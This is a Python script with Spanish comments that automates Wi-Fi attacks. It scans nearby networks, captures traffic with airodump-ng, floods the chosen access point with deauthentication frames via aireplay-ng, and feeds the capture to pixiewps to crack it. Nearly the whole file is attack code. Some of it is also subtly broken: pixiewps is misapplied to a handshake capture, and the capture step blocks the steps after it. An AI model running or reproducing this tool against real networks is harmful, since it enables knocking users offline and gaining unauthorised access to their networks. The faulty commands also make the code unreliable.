import subprocess
import re

def run_command(command):
    """Ejecuta un comando de shell y muestra la salida"""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode()
    else:
        print(stderr.decode())
        return ""

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...")
    resultado = run_command("su -c 'iw dev wlan0 scan'")
    redes = []
    bssids = []
    canales = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1]
            bssids.append(bssid)
        if "freq" in linea:
            channel = int((int(linea.split()[1]) - 2407) / 5)
            canales.append(channel)
    return redes, bssids, canales

def capturar_paquetes(bssid, channel):
    """Capturar paquetes de una red específica"""
    print(f"Capturando paquetes de la red con BSSID {bssid} en el canal {channel}...")
    run_command(f"su -c 'airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0'")

def deauth_attack(bssid):
    """Realizar un ataque de desautenticación"""
    print(f"Realizando ataque de desautenticación contra {bssid}...")
    run_command(f"su -c 'aireplay-ng --deauth 10 -a {bssid} wlan0'")

def pixiewps_attack(handshake_file):
    """Realizar un ataque Pixiewps sobre un archivo de handshake"""
    print(f"Realizando ataque Pixiewps sobre {handshake_file}...")
    run_command(f"su -c 'pixiewps -f -i {handshake_file} -o cracked.txt'")

def main():
    # Escanear redes Wi-Fi
    redes, bssids, canales = scan_wifi()
    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red}")
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        bssid_seleccionado = bssids[seleccion]
        canal_seleccionado = canales[seleccion]
        
        print(f"Red seleccionada: {red_seleccionada}")
        print(f"BSSID: {bssid_seleccionado}")
        print(f"Canal: {canal_seleccionado}")
        
        capturar_paquetes(bssid_seleccionado, canal_seleccionado)
        deauth_attack(bssid_seleccionado)
        
        handshake_file = "handshake-01.cap"  # Nombre del archivo de handshake generado por airodump-ng
        pixiewps_attack(handshake_file)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()






